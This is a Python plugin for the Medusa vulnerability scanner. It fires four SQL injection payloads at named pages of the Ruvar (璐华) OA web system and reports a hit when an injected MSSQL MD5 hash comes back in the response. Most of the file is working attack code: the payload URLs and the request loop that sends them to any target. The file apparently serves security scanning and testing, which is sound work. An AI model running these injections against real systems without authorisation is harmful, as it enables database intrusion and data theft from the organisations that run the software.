#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 璐华OA系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0104430
author: Lucifer
description: ruvaroa多处SQL注入。
'''
import urllib
import requests
import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "Ruvar_multi_sqli2"  # 插件名称
        self.info['name'] ='璐华OA_SQL注入' #漏洞名称
        self.info['affects'] = "璐华OA"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/PersonalAffair/worklog_template_show.aspx?id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/ProjectManage/pm_gatt_inc.aspx?project_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkPlan/plan_template_preview.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27AnD%20%28Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))%29%3E0%29--"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
                _t = VulnerabilityInfo(Medusa)
                web = ClassCongregation.VulnerabilityDetails(_t.info)
                web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
    except:
            logging.warning(Url)
            _ = VulnerabilityInfo('')
            logging.warning(_.info.get('parameter'))
    _t = VulnerabilityInfo(Medusas)
    return (_t.info)